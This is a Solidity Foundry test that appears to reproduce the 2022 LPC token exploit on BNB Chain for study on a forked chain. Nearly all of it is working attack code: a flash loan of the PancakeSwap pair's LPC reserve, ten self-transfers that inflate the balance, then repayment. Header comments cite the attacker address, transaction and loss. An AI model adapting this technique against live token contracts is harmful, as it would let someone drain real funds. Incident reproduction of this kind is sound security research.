// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 178 BNB (~ 45,715 US$)
// Attacker : 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c
// AttackContract : 0xcfb7909b7eb27b71fdc482a2883049351a1749d7
// Txhash : 0x0e970ed84424d8ea51f6460ce6105ab68441d4450a80bc8d749fdf01e504ed8c

// @Info
// LPC Contract : https://bscscan.com/address/0x1e813fa05739bf145c1f182cb950da7af046778d#code#L1240

// @NewsTrack
// PANews : https://www.panewslab.com/zh_hk/articledetails/uwv4sma2.html
// Beosin Alert : https://twitter.com/BeosinAlert/status/1551535854681718784

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant attacker = 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c;
address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;

contract Exploit is Test {
    function setUp() public {
        cheat.createSelectFork("bsc", 19_852_596);
        cheat.label(LPC, "LPC");
        cheat.label(pancakePair, "PancakeSwap LPC/USDT");
    }

    function testExploit() public {
        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);

        console.log("Get LPC reserve in PancakeSwap...");
        (uint256 LPC_reserve,,) = IPancakePair(pancakePair).getReserves();
        emit log_named_decimal_uint("\tLPC Reserve", LPC_reserve, 18);

        console.log("Flashloan all the LPC reserve...");
        uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid trigger INSUFFICIENT_LIQUIDITY
        bytes memory data = unicode"⚡💰";
        IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);
        console.log("Flashloan ended");

        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);
        console.log("\nNext transaction will swap LPC to USDT");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("\tSuccessfully borrow LPC from PancakeSwap");
        uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));
        emit log_named_decimal_uint("\tFlashloaned LPC", LPC_balance, 18);

        console.log("\tExploit...");
        for (uint8 i; i < 10; ++i) {
            console.log("\tSelf transfer... Loop %s", i);
            IERC20(LPC).transfer(address(this), LPC_balance);
        }

        console.log("\tPayback flashloan...");
        uint256 paybackAmount = amount0 / 90 / 100 * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%
        IERC20(LPC).transfer(pancakePair, paybackAmount);
    }
}
